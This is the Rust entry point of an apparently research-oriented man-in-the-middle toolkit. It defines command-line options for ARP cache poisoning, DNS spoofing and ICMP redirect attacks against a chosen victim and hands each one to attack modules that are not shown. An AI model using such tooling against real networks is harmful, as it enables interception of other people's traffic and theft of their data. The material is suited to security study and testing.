mod arp_spoof;
mod dns_hijack;
mod icmp_redirect;
mod utils;

use clap::{Args, Parser, Subcommand};

#[derive(Parser)]
#[command(
    version,
    about = "Pathfinder is a CLI-only MITM toolkit for security research."
)]
#[command(propagate_version = true)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Craft and send forged ARP replies to poison a target's ARP cache.
    ArpPoison(ArpPoisonArgs),
    /// Respond to DNS requests with a spoofed IP address.
    DnsHijack(DnsHijackArgs),
    /// Send an ICMP redirect to steer traffic through the attacker.
    IcmpRedirect(IcmpRedirectArgs),
}

#[derive(Args)]
struct ArpPoisonArgs {
    /// Network interface to use. Defaults to the primary device.
    #[arg(short, long)]
    interface: Option<String>,
    /// IP address the victim should associate with our MAC (usually the gateway).
    #[arg(short = 's', long, value_name = "IP")]
    spoofed_ip: String,
    /// MAC address to claim for the spoofed IP (attacker MAC if omitted).
    #[arg(short = 'm', long, value_name = "MAC")]
    spoofed_mac: Option<String>,
    /// Victim IP address to poison.
    #[arg(short, long, value_name = "IP")]
    target_ip: String,
    /// Victim MAC address to target.
    #[arg(short = 't', long, value_name = "MAC")]
    target_mac: String,
}

#[derive(Args)]
struct DnsHijackArgs {
    /// Network interface to use. Defaults to the primary device.
    #[arg(short, long)]
    interface: Option<String>,
    /// Domain name to spoof.
    #[arg(short, long)]
    domain: String,
    /// IP address to return for the spoofed domain.
    #[arg(short, long, value_name = "IP")]
    forged_ip: String,
    /// IP address to impersonate as the DNS server (defaults to request destination).
    #[arg(long, value_name = "IP")]
    spoofed_dns: Option<String>,
}

#[derive(Args)]
struct IcmpRedirectArgs {
    /// Network interface to use. Defaults to the primary device.
    #[arg(short, long)]
    interface: Option<String>,
    /// Victim IP address that will receive the redirect.
    #[arg(short, long, value_name = "IP")]
    target_ip: String,
    /// The gateway IP address that should be advertised as the better route.
    #[arg(short = 'g', long, value_name = "IP")]
    new_gateway: String,
}

fn main() {
    let cli = Cli::parse();

    match cli.command {
        Commands::ArpPoison(args) => arp_poison(args),
        Commands::DnsHijack(args) => dns_hijack(args),
        Commands::IcmpRedirect(args) => icmp_redirect(args),
    }
}

fn arp_poison(args: ArpPoisonArgs) {
    let interface = utils::default_interface_or(args.interface);
    let spoofed_ip = utils::parse_ipv4(&args.spoofed_ip).expect("invalid spoofed IP");
    let target_ip = utils::parse_ipv4(&args.target_ip).expect("invalid target IP");
    let target_mac = utils::parse_mac(&args.target_mac).expect("invalid target MAC");
    let spoofed_mac = args
        .spoofed_mac
        .as_ref()
        .map(|m| utils::parse_mac(m).expect("invalid spoofed MAC"))
        .unwrap_or_else(|| utils::host_mac_on(&interface).unwrap_or([0; 6]));

    if let Err(err) =
        arp_spoof::send_arp_poison(&interface, spoofed_ip, spoofed_mac, target_ip, target_mac)
    {
        eprintln!("[!] failed to send ARP poison: {err}");
    }
}

fn dns_hijack(args: DnsHijackArgs) {
    let interface = utils::default_interface_or(args.interface);
    let forged_ip = utils::parse_ipv4(&args.forged_ip).expect("invalid forged IP");
    let spoofed_dns = args
        .spoofed_dns
        .as_ref()
        .map(|ip| utils::parse_ipv4(ip).expect("invalid DNS IP"));

    if let Err(err) = dns_hijack::run(&interface, &args.domain, forged_ip, spoofed_dns) {
        eprintln!("[!] DNS hijack failed: {err}");
    }
}

fn icmp_redirect(args: IcmpRedirectArgs) {
    let interface = utils::default_interface_or(args.interface);
    let target_ip = utils::parse_ipv4(&args.target_ip).expect("invalid target IP");
    let new_gateway = utils::parse_ipv4(&args.new_gateway).expect("invalid gateway IP");

    if let Err(err) = icmp_redirect::send_redirect(&interface, target_ip, new_gateway) {
        eprintln!("[!] ICMP redirect failed: {err}");
    }
}
